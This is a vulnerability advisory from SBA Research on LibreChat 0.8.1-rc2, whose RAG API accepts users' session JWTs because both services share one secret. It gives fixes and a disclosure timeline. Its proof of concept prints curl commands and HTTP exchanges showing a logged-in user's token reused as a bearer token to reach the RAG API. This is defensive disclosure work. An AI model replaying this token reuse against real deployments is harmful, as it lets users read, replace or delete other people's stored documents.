# LibreChat RAG API Authentication Bypass #

## Vulnerability Overview ##

LibreChat version 0.8.1-rc2 uses the same JWT secret for the user session
mechanism and RAG API which compromises the service-level authentication of
the RAG API.

* **Identifier**            : SBA-ADV-20251205-01
* **Type of Vulnerability** : Incorrect Access Control
* **Software/Product Name** : [LibreChat](https://github.com/danny-avila/LibreChat)
* **Vendor**                : [LibreChat](https://www.librechat.ai/)
* **Affected Versions**     : 0.8.1-rc2
* **Fixed in Version**      : Not yet
* **CVE ID**                : Not yet
* **CVSSv3 Vector**         : CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
* **CVSSv3 Base Score**     : 8.0 (High)

## Vendor Description ##

> LibreChat is the ultimate open-source app for all your AI conversations,
> fully customizable and compatible with any AI provider — all in one sleek
> interface.

Source: <https://www.librechat.ai/>

## Impact ##

An authenticated attacker can use the user visible LibreChat session token to
authenticate against the RAG API and use all RAG API endpoints since there is
no further access control beyond the service-level authentication. Therefore,
the attacker can read, replace and delete all documents or upload new
documents. Since the RAG API is usually only accessible internally, it is
necessary to either have internal network access or combine it with another
vulnerability.

## Vulnerability Description ##

LibreChat can use the RAG API for processing files. In the recommended Docker
Compose setup, RAG API uses the same JWT authentication secret (environment
variable `JWT_SECRET`) that LibreChat uses for the user session management.
LibreChat does not support using different JWT secrets. Moreover, after a
successful login to LibreChat, it issues a JWT token to the user, which the
browser running the UI uses to access the LibreChat API. An attacker who can
log into LibreChat, can use this JWT token to directly authenticate against
the RAG API. Since RAG API uses the same JWT secret and no further
restrictions like audience are checked or contained within the JWT, it accepts
the authentication. This gives the attacker full access to all RAG API
endpoints since it only supports service-level authentication and is not
designed in a way that a user should be able to access it directly.

## Proof of Concept ##

We use a standard Docker Compose setup with LibreChat and RAG API. When trying
to access the RAG API without authentication, the request is denied:

```shellsession
$ curl -v http://172.18.0.5:8000/ids
*   Trying 172.18.0.5:8000...
* Established connection to 172.18.0.5 (172.18.0.5 port 8000) from 172.18.0.1 port 60864
* using HTTP/1.x
> GET /ids HTTP/1.1
> Host: 172.18.0.5:8000
> User-Agent: curl/8.17.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< date: Thu, 11 Dec 2025 16:50:35 GMT
< server: uvicorn
< content-length: 52
< content-type: application/json
<
* Connection #0 to host 172.18.0.5:8000 left intact
{"detail":"Missing or invalid Authorization header"}
```

Next, we log into LibreChat and observe the tokens returned to the user:

```http
POST /api/auth/login HTTP/1.1
Host: localhost:3080
Content-Length: 46
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/json
Connection: keep-alive
[...]

{"email":"pt1@example.com","password":"12345678"}

HTTP/1.1 200 OK
X-Robots-Tag: noindex
Access-Control-Allow-Origin: *
X-RateLimit-Limit: 7
X-RateLimit-Remaining: 6
Date: Thu, 11 Dec 2025 16:37:46 GMT
X-RateLimit-Reset: 1765471367
Set-Cookie: refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY5M2FmMzUyNzU5MTVlNTQyMTZiMWE0OCIsInNlc3Npb25JZCI6IjY5M2FmMzVhNzU5MTVlNTQyMTZiMWE0ZSIsImlhdCI6MTc2NTQ3MTA2NiwiZXhwIjoxNzY2MDc1ODY1fQ.hZQM-KInH5Unwovvo1zBFNgWmX0pwer1EhyChICBPqw; Path=/; Expires=Thu, 18 Dec 2025 16:37:46 GMT; HttpOnly; Secure; SameSite=Strict
Set-Cookie: token_provider=librechat; Path=/; Expires=Thu, 18 Dec 2025 16:37:46 GMT; HttpOnly; Secure; SameSite=Strict
Content-Type: application/json; charset=utf-8
Content-Length: 682
ETag: W/"2a3-hDwVDgsVWNb8yUDJWd8jOkcC1sY"
Vary: Accept-Encoding
Connection: keep-alive
Keep-Alive: timeout=5

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY5M2FmMzUyNzU5MTVlNTQyMTZiMWE0OCIsInVzZXJuYW1lIjoiIiwicHJvdmlkZXIiOiJsb2NhbCIsImVtYWlsIjoicHQxQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY1NDcxMDY2LCJleHAiOjE3NjU0NzE5NjZ9.3zKi6clYiZOVvCCY6_ERCPeSs5EeKo3wNNIrBswycRw","user":{"_id":"693af35275915e54216b1a48","name":"pt1","username":"","email":"pt1@example.com","emailVerified":true,"avatar":null,"provider":"local","role":"ADMIN","plugins":[],"twoFactorEnabled":false,"termsAccepted":false,"personalization":{"memories":true,"_id":"693af35275915e54216b1a47"},"refreshToken":[],"createdAt":"2025-12-11T16:37:38.703Z","updatedAt":"2025-12-11T16:37:38.717Z","id":"693af35275915e54216b1a48"}}
```

LibreChat returns a JWT token that allows the UI to access the LibreChat API.
However, the JWT token is also valid for the RAG API, as the following HTTP
communication shows:

```shellsession
$ curl -v -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY5M2FmMzUyNzU5MTVlNTQyMTZiMWE0OCIsInVzZXJuYW1lIjoiIiwicHJvdmlkZXIiOiJsb2NhbCIsImVtYWlsIjoicHQxQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY1NDcxMDY2LCJleHAiOjE3NjU0NzE5NjZ9.3zKi6clYiZOVvCCY6_ERCPeSs5EeKo3wNNIrBswycRw" http://172.18.0.5:8000/ids
*   Trying 172.18.0.5:8000...
* Established connection to 172.18.0.5 (172.18.0.5 port 8000) from 172.18.0.1 port 60874
* using HTTP/1.x
> GET /ids HTTP/1.1
> Host: 172.18.0.5:8000
> User-Agent: curl/8.17.0
> Accept: */*
> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY5M2FmMzUyNzU5MTVlNTQyMTZiMWE0OCIsInVzZXJuYW1lIjoiIiwicHJvdmlkZXIiOiJsb2NhbCIsImVtYWlsIjoicHQxQGV4YW1wbGUuY29tIiwiaWF0IjoxNzY1NDcxMDY2LCJleHAiOjE3NjU0NzE5NjZ9.3zKi6clYiZOVvCCY6_ERCPeSs5EeKo3wNNIrBswycRw
>
* Request completely sent off
< HTTP/1.1 200 OK
< date: Thu, 11 Dec 2025 16:50:38 GMT
< server: uvicorn
< content-length: 2
< content-type: application/json
<
* Connection #0 to host 172.18.0.5:8000 left intact
["34f012e0-377a-4aa6-96f5-62f8a5949a25"]
```

Since RAG API does not provide access control beyond the service-level
authentication, it is possible to access stored documents and also replace and
delete them.

## Recommended Countermeasures ##

We are not aware of a fix yet. Please contact the vendor.

We recommend using a separate JWT secret for the service-level authentication
of the RAG API. Furthermore, we recommend adding audience claims to the JWT
tokens and validate them in LibreChat and the RAG API, so that JWT tokens
cannot be re-used even when the JWT secret is the same.

Moreover, we recommend using separate environment files for each service in
the recommended Docker Compose setup, so that services like the RAG API only
have access to the secrets they really need.

## Timeline ##

* `2025-12-05` identification of vulnerability in version 0.8.1-rc2
* `2025-12-17` disclosed vulnerability to project via GitHub
               (GHSA-47h3-3457-xwpv)
* `2026-03-03` maintainer stated that the vulnerability is not externally
               exploitable anymore in default deployment due to SSRF fixes
* `2026-03-03` maintainer closed GitHub advisory
* `2026-03-18` public disclosure

## References ##

1. OWASP Web Security Testing Guide (WSTG) v4.2. Testing for Bypassing
   Authentication Schema:
   <https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema>
2. OWASP Top 10. A07:2021 Identification and Authentication Failures:
   <https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/>
3. Common Weakness Enumeration. CWE-284 Improper Access Control:
   <https://cwe.mitre.org/data/definitions/284.html>

## Credits ##

* Lisa Gnedt ([SBA Research](https://www.sba-research.org/))
* Michael Koppmann ([SBA Research](https://www.sba-research.org/))

The discovery of this vulnerability was made possible through support from
[CYSSDE](https://cyssde.eu/) and the European Union.

![CYSSDE](images/cyssde.png)
